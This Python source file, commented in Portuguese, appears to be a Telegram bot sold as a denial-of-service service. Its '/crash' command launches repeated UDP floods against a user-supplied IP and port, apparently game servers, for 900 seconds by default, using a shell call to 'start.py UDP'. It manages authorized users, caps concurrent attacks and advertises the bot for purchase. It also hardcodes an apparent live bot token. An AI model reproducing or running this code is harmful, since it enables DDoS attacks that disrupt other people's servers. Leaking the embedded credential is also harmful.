import telebot
import subprocess
import re
import json
import time

# Configurações do bot
BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
SEU_ID_TELEGRAM = 6430703027
bot = telebot.TeleBot(BOT_TOKEN)
processos = {}  # Dicionário para gerenciar ataques
MAX_ATTACKS = 3  # Limite de ataques simultâneos

# Função para carregar usuários autorizados de um arquivo JSON
def carregar_usuarios():
    try:
        with open("usuarios_autorizados.json", "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return [SEU_ID_TELEGRAM]  # Adiciona o ID do dono como padrão
    except json.JSONDecodeError:
        return [SEU_ID_TELEGRAM]

# Função para salvar usuários autorizados de um arquivo JSON
def salvar_usuarios():
    with open("usuarios_autorizados.json", "w") as f:
        json.dump(authorized_users, f)

# Lista de usuários autorizados
authorized_users = carregar_usuarios()

# Função para validar o formato de IP:PORTA
def validar_ip_porta(ip_porta):
    padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
    return re.match(padrao, ip_porta) is not None

# Função para gerenciar o limite de ataques simultâneos
def gerenciar_ataques():
    if len(processos) >= MAX_ATTACKS:
        ataque_antigo = list(processos.keys())[0]
        processo_antigo = processos.pop(ataque_antigo)
        processo_antigo.terminate()
        bot.send_message(SEU_ID_TELEGRAM, f"Ataque para {ataque_antigo} finalizado para liberar espaço.")

# Comando /start
@bot.message_handler(commands=['start'])
def start_message(message):
    welcome_text = (
        "Bem-vindo ao bot! 🚀\n\n"
        "Aqui estão os comandos disponíveis para você:\n\n"
        "*Comandos básicos:*\n"
        "`/crash <IP da partida> [tempo]` - Envia um ataque ao IP especificado. "
        "(Padrão 900 segundos)\n"
        "`/meuid` - Mostra seu ID de usuário.\n\n"
        "*Comandos para o dono do bot:*\n"
        "`/adduser <ID>` - Adiciona um usuário autorizado.\n"
        "`/removeuser <ID>` - Remove um usuário autorizado.\n"
        "`/listusers` - Mostra a lista de usuários autorizados.\n\n"
        "Quer comprar o bot? Entre em contato comigo no Telegram: "
        "[werbert_ofc](https://t.me/werbert_ofc)\n\n"
        "_Se precisar de ajuda, estou à disposição!_ 😉"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

# Função para executar o ataque em loop
def executar_ataque(ip_porta, threads, duracao):
    tempo_inicial = time.time()
    while time.time() - tempo_inicial < int(duracao):
        comando_terminal = f"python3 start.py UDP {ip_porta} {threads} 5"
        subprocess.call(comando_terminal, shell=True)
        time.sleep(5)  # Aguarda 5 segundos antes de enviar novamente

# Comando /crash
@bot.message_handler(commands=['crash'])
def crash_server(message):
    if message.from_user.id not in authorized_users:
        bot.send_message(message.chat.id, "Acesso negado.")
        return

    comando = message.text.split()
    if len(comando) < 2:
        bot.send_message(message.chat.id, "Uso correto: /crash <IP da partida> [tempo]")
        return

    ip_porta = comando[1]
    tempo = "900"  # Padrão de tempo

    if not validar_ip_porta(ip_porta):
        bot.send_message(message.chat.id, "Formato de IP:PORTA inválido.")
        return

    if len(comando) == 3:
        tempo = comando[2]

    if ip_porta in processos:
        bot.send_message(message.chat.id, f"Já existe um ataque em andamento para {ip_porta}.")
        return

    gerenciar_ataques()
    processo = subprocess.Popen(
        lambda: executar_ataque(ip_porta, 10, tempo), shell=False
    )
    processos[ip_porta] = processo
    bot.send_message(message.chat.id, f"Ataque iniciado para {ip_porta} por {tempo} segundos.")

# Comando /meuid
@bot.message_handler(commands=['meuid'])
def send_user_id(message):
    bot.send_message(message.chat.id, f"Seu ID de usuário é: {message.from_user.id}")

# Comando /adduser e /removeuser
@bot.message_handler(commands=['adduser', 'removeuser'])
def admin_commands(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "Acesso negado.")
        return

    comando = message.text.split()
    if len(comando) != 2:
        bot.send_message(message.chat.id, "Uso correto: /adduser <ID>, /removeuser <ID>")
        return

    try:
        usuario_id = int(comando[1])
    except ValueError:
        bot.send_message(message.chat.id, "ID inválido. Por favor, insira um número válido.")
        return

    if comando[0] == "/adduser":
        if usuario_id not in authorized_users:
            authorized_users.append(usuario_id)
            salvar_usuarios()
            bot.send_message(message.chat.id, f"Usuário {usuario_id} adicionado com sucesso.")
        else:
            bot.send_message(message.chat.id, "Usuário já autorizado.")
    
    elif comando[0] == "/removeuser":
        if usuario_id in authorized_users:
            authorized_users.remove(usuario_id)
            salvar_usuarios()
            bot.send_message(message.chat.id, f"Usuário {usuario_id} removido com sucesso.")
        else:
            bot.send_message(message.chat.id, "Usuário não encontrado.")

# Comando /listusers
@bot.message_handler(commands=['listusers'])
def list_users(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "Acesso negado.")
        return

    if not authorized_users:
        bot.send_message(message.chat.id, "Nenhum usuário autorizado encontrado.")
        return

    user_list = "Lista de usuários autorizados:\n\n"
    for user_id in authorized_users:
        cargo = "Dono" if user_id == SEU_ID_TELEGRAM else "Usuário"
        user_list += f"ID: {user_id} - Cargo: {cargo}\n"

    bot.send_message(message.chat.id, user_list)

# Função principal
def main():
    while True:
        try:
            bot.polling(non_stop=True, timeout=60)
        except Exception as e:
            print(f"Erro no bot: {e}")
            time.sleep(15)

if __name__ == "__main__":
    main()